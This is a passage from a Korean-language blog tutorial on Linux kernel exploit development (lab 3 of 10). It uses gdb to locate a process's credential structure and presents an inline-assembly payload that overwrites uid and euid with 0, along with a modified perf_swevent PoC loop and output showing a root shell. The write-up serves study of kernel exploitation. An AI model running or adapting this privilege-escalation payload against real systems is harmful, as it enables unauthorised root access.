</pre></table></code></div></div><p>이 출력만 봐서는 <code class="language-plaintext highlighter-rouge">thread_info</code> 구조체가 맞는지 정확하게 체크하기 힘드니 <code class="language-plaintext highlighter-rouge">task_struct</code> 구조체와 <code class="language-plaintext highlighter-rouge">real_cred</code>도 같은 방법으로 확인해보자.</p><p><strong>task_struct</strong></p><div class="language-sh highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre><td class="rouge-code"><pre><span class="o">(</span>gdb<span class="o">)</span> p <span class="k">*</span><span class="nv">$1</span>.task
<span class="nv">$3</span> <span class="o">=</span> <span class="o">{</span>state <span class="o">=</span> 0, stack <span class="o">=</span> 0xffff88007814a000, usage <span class="o">=</span> <span class="o">{</span>counter <span class="o">=</span> 2<span class="o">}</span>,
  flags <span class="o">=</span> 4202496, ptrace <span class="o">=</span> 0, wake_entry <span class="o">=</span> <span class="o">{</span>
    next <span class="o">=</span> 0x0 &lt;irq_stack_union&gt;<span class="o">}</span>, on_cpu <span class="o">=</span> 1, on_rq <span class="o">=</span> 1, prio <span class="o">=</span> 120,
...
...
  real_cred <span class="o">=</span> 0xffff880076116840,
  cred <span class="o">=</span> 0xffff880076116840,
  <span class="nb">comm</span> <span class="o">=</span> <span class="s2">"vnik"</span>, <span class="s1">'\000'</span> &lt;repeats 11 <span class="nb">times</span><span class="o">&gt;</span>, link_count <span class="o">=</span> 0,
...
...
  ptrace_bp_refcnt <span class="o">=</span> <span class="o">{</span>counter <span class="o">=</span> 1<span class="o">}</span>, utask <span class="o">=</span> 0x0 &lt;irq_stack_union&gt;,
  uprobe_srcu_id <span class="o">=</span> <span class="nt">-1</span><span class="o">}</span>
<span class="o">(</span>gdb<span class="o">)</span>
</pre></table></code></div></div><p><strong>real_cred</strong></p><div class="language-sh highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre><td class="rouge-code"><pre><span class="o">(</span>gdb<span class="o">)</span> p <span class="k">*</span><span class="nv">$1</span>.task.real_cred
<span class="nv">$4</span> <span class="o">=</span> <span class="o">{</span>usage <span class="o">=</span> <span class="o">{</span>counter <span class="o">=</span> 3<span class="o">}</span>, uid <span class="o">=</span> 1001, gid <span class="o">=</span> 1001, suid <span class="o">=</span> 1001,
  sgid <span class="o">=</span> 1001, euid <span class="o">=</span> 1001, egid <span class="o">=</span> 1001, fsuid <span class="o">=</span> 1001, fsgid <span class="o">=</span> 1001,
  securebits <span class="o">=</span> 0, cap_inheritable <span class="o">=</span> <span class="o">{</span>cap <span class="o">=</span> <span class="o">{</span>0, 0<span class="o">}}</span>, cap_permitted <span class="o">=</span> <span class="o">{</span>
    cap <span class="o">=</span> <span class="o">{</span>0, 0<span class="o">}}</span>, cap_effective <span class="o">=</span> <span class="o">{</span>cap <span class="o">=</span> <span class="o">{</span>0, 0<span class="o">}}</span>, cap_bset <span class="o">=</span> <span class="o">{</span>cap <span class="o">=</span> <span class="o">{</span>
      4294967295, 4294967295<span class="o">}}</span>, jit_keyring <span class="o">=</span> 0 <span class="s1">'\000'</span>,
  thread_keyring <span class="o">=</span> 0x0 &lt;irq_stack_union&gt;,
  request_key_auth <span class="o">=</span> 0x0 &lt;irq_stack_union&gt;,
  tgcred <span class="o">=</span> 0xffff8800795d5300, security <span class="o">=</span> 0xffff88007a05fb60,
  user <span class="o">=</span> 0xffff88003647bf80,
  user_ns <span class="o">=</span> 0xffffffff81c25700 &lt;init_user_ns&gt;,
  group_info <span class="o">=</span> 0xffff88007618fa40, rcu <span class="o">=</span> <span class="o">{</span>
    next <span class="o">=</span> 0x0 &lt;irq_stack_union&gt;, func <span class="o">=</span> 0x0 &lt;irq_stack_union&gt;<span class="o">}}</span>
<span class="o">(</span>gdb<span class="o">)</span>
</pre></table></code></div></div><p><code class="language-plaintext highlighter-rouge">real_cred</code>의 <code class="language-plaintext highlighter-rouge">uid</code>와 <code class="language-plaintext highlighter-rouge">euid</code>가 <code class="language-plaintext highlighter-rouge">1001</code>로 정확하게 들어가 있는 것을 확인할 수 있다. 이제 <code class="language-plaintext highlighter-rouge">real_cred</code> 구조체의 주소를 자동으로 구해야 한다. 나는 아래와 같이 인라인 어셈블리를 사용하여 수정해서 자동화에 성공했다.</p><div class="language-c highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
</pre><td class="rouge-code"><pre><span class="kt">void</span> <span class="nf">__attribute__</span><span class="p">((</span><span class="n">regparm</span><span class="p">(</span><span class="mi">3</span><span class="p">)))</span> <span class="n">payload</span><span class="p">()</span> <span class="p">{</span>
        <span class="n">asm</span><span class="p">(</span>
                <span class="s">"pushq %rax;"</span>                                   <span class="cm">/* save Registers */</span>
                <span class="s">"pushq %rcx;"</span>
                <span class="s">"movq $0xffffffffffffffff, 0xffffffff81ef5940;"</span> <span class="cm">/* set perf_swevent_enabled = -1 */</span>
                <span class="s">"movq %rsp, %rax;"</span>                              <span class="cm">/* get SP */</span>
                <span class="s">"movq $0xFFFFFFFFFFFFE000, %rcx;"</span>               <span class="cm">/* calc THREAD_SIZE */</span>
                <span class="s">"andq %rcx, %rax;"</span>                              <span class="cm">/* calc thread_info */</span>
                <span class="s">"movq (%rax), %rcx;"</span>                            <span class="cm">/* get task_struct */</span>
                <span class="s">"movq 0x458(%rcx), %rax;"</span>                       <span class="cm">/* get real_cred */</span>
                <span class="s">"movl $0, 0x04(%rax);"</span>                          <span class="cm">/* set  uid */</span>
                <span class="s">"movl $0, 0x14(%rax);"</span>                          <span class="cm">/* set euid */</span>
                <span class="s">"popq %rcx;"</span>                                    <span class="cm">/* restore Registers */</span>
                <span class="s">"popq %rax;"</span>
        <span class="p">);</span>
<span class="p">}</span>
</pre></table></code></div></div><p><strong>for문 블럭 안의 내용 dead code화 (j &lt; 0)</strong></p><div class="language-c highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre><span class="k">for</span> <span class="p">(</span><span class="n">j</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">j</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">;</span> <span class="n">j</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
	<span class="n">needle</span> <span class="o">=</span> <span class="n">AB</span><span class="p">(</span><span class="n">j</span><span class="o">+</span><span class="mi">1</span><span class="p">);</span>
	<span class="n">printf</span><span class="p">(</span><span class="s">"j:      %x</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">j</span><span class="p">);</span>
	<span class="n">printf</span><span class="p">(</span><span class="s">"needle: %lx</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">needle</span><span class="p">);</span>
	<span class="n">assert</span><span class="p">(</span><span class="n">p</span> <span class="o">=</span> <span class="n">memmem</span><span class="p">(</span><span class="n">code</span><span class="p">,</span> <span class="mi">1024</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">needle</span><span class="p">,</span> <span class="mi">8</span><span class="p">));</span>
	<span class="o">*</span><span class="n">p</span> <span class="o">=</span> <span class="o">!</span><span class="n">j</span> <span class="o">?</span> <span class="p">(</span><span class="n">idt</span><span class="p">.</span><span class="n">addr</span> <span class="o">+</span> <span class="n">int_n</span> <span class="o">*</span> <span class="mi">16</span> <span class="o">+</span> <span class="mi">8</span><span class="p">)</span> <span class="o">:</span> <span class="n">targets</span><span class="p">[</span><span class="n">target</span><span class="p">][</span><span class="n">j</span><span class="p">];</span>
<span class="p">}</span>
</pre></table></code></div></div><p><strong>result</strong></p><div class="language-sh highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre><span class="nb">test</span>@ubuntu:~/exercises/perf<span class="nv">$ </span>./vnik 2
IDT addr <span class="o">=</span> 0xffffffff81dd6000
Using int <span class="o">=</span> 4 with offset <span class="o">=</span> <span class="nt">-49077</span>
root@ununtu:~/exercises/perf#
</pre></table></code></div></div><p>난이도가 갑자기 상승했고, PoC도 실행이 됬다 안됬다 해서 내잘못인지, PoC잘못인지 헷갈려 하다가 시간이 훅훅 지나가버렸다. 빠르게 다음 Lab으로 이동하자!</p><hr /><h1 id="references">References</h1><p>[thread_info를 통한 커널 익스 문제] <a href="https://blackperl-security.gitlab.io/blog/2018/08/20/2018-08-20-sendpage_02_analysis/">https://blackperl-security.gitlab.io/blog/2018/08/20/2018-08-20-sendpage_02_analysis/</a></p><div class="footnotes" role="doc-endnotes"><ol><li id="fn:x64_syscall_table" role="doc-endnote"><p><a href="https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/">https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/</a> <a href="#fnref:x64_syscall_table" class="reversefootnote" role="doc-backlink">&#8617;</a></p></ol></div></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/pwn/'>pwn</a>, <a href='/categories/linux/'>linux</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/kernel/" class="post-tag no-text-decoration" >kernel</a> <a href="/tags/exploit/" class="post-tag no-text-decoration" >exploit</a> <a href="/tags/tutorial/" class="post-tag no-text-decoration" >tutorial</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Linux Kernel Exploit Development (Part 3/10) - do:pwn()&url=https://nonetype.kr/posts/Linux-Kernel-Exploit-Development-lab3/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Linux Kernel Exploit Development (Part 3/10) - do:pwn()&u=https://nonetype.kr/posts/Linux-Kernel-Exploit-Development-lab3/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=Linux Kernel Exploit Development (Part 3/10) - do:pwn()&url=https://nonetype.kr/posts/Linux-Kernel-Exploit-Development-lab3/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i class="fa-fw fas fa-link small" onclick="copyLink()" data-toggle="tooltip" data-placement="top" title="Copy link"></i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"> <span>Recent Update</span><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/DLL-Hijacking/">DLL Hijacking Note</a><li><a href="/posts/BlazeCTF2018-blazeme-write-up/">blazeme - BlazeCTF 2018</a><li><a href="/posts/Linux-Kernel-Exploit-Development-lab1/">Linux Kernel Exploit Development (Part 1/10)</a><li><a href="/posts/Linux-Kernel-Exploit-Development-lab2/">Linux Kernel Exploit Development (Part 2/10)</a><li><a href="/posts/Linux-Kernel-Exploit-Development-lab3/">Linux Kernel Exploit Development (Part 3/10)</a></ul></div><div id="access-tags"> <span>Trending Tags</span><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/kernel/">kernel</a> <a class="post-tag" href="/tags/exploit/">exploit</a> <a class="post-tag" href="/tags/debugging/">debugging</a> <a class="post-tag" href="/tags/tutorial/">tutorial</a> <a class="post-tag" href="/tags/tips/">tips</a> <a class="post-tag" href="/tags/firefox/">firefox</a> <a class="post-tag" href="/tags/heap/">heap</a> <a class="post-tag" href="/tags/1-day/">1-day</a> <a class="post-tag" href="/tags/analysis/">analysis</a> <a class="post-tag" href="/tags/ctf/">ctf</a></div></div></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/Linux-Kernel-Exploit-Development-lab1/"><div class="card-body"> <span class="timeago small" > Sep 23, 2019 <i class="unloaded">2019-09-23T00:00:00+08:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Linux Kernel Exploit Development (Part 1/10)</h3><div class="text-muted small"><p> Linux Kernel Exploit Development with VMware - Lab1::Debugging Environment 목차 목차 Debugging Environment Debugger Attach Debug Program Debugging Environment 우선 디버깅 환경을 살펴보니 MasterVM와...</p></div></div></a></div><div class="card"> <a href="/posts/Linux-Kernel-Exploit-Development-lab2/"><div class="card-body"> <span class="timeago small" > Sep 23, 2019 <i class="unloaded">2019-09-23T00:00:00+08:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Linux Kernel Exploit Development (Part 2/10)</h3><div class="text-muted small"><p> Linux Kernel Exploit Development with VMware - Lab2::Module Debugging 목차 목차 The Kernel Module Debugger Attach to Kernel Module Debug Kernel Module The Kernel Module TestVM의 mod_sam...</p></div></div></a></div><div class="card"> <a href="/posts/Linux-Kernel-Exploit-Development-lab4/"><div class="card-body"> <span class="timeago small" > Sep 23, 2019 <i class="unloaded">2019-09-23T00:00:00+08:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Linux Kernel Exploit Development (Part 4/10)</h3><div class="text-muted small"><p> Linux Kernel Exploit Development with VMware - Lab4::ret2usr 목차 목차 ret2usr Arbitary Address Write Exploit Partical Write Exploit IDT overwrite The IDT(Interrupt Descriptor ...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/Linux-Kernel-Exploit-Development-lab2/" class="btn btn-outline-primary" prompt="Older"><p>Linux Kernel Exploit Development (Part 2/10)</p></a> <a href="/posts/Linux-Kernel-Exploit-Development-lab4/" class="btn btn-outline-primary" prompt="Newer"><p>Linux Kernel Exploit Development (Part 4/10)</p></a></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> © 2021 <a href="https://twitter.com/nonetype_pwn">Wonyoung Jung</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/tags/kernel/">kernel</a> <a class="post-tag" href="/tags/exploit/">exploit</a> <a class="post-tag" href="/tags/debugging/">debugging</a> <a class="post-tag" href="/tags/tutorial/">tutorial</a> <a class="post-tag" href="/tags/tips/">tips</a> <a class="post-tag" href="/tags/firefox/">firefox</a> <a class="post-tag" href="/tags/heap/">heap</a> <a class="post-tag" href="/tags/1-day/">1 day</a> <a class="post-tag" href="/tags/analysis/">analysis</a> <a class="post-tag" href="/tags/ctf/">ctf</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="https://nonetype.kr{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script>
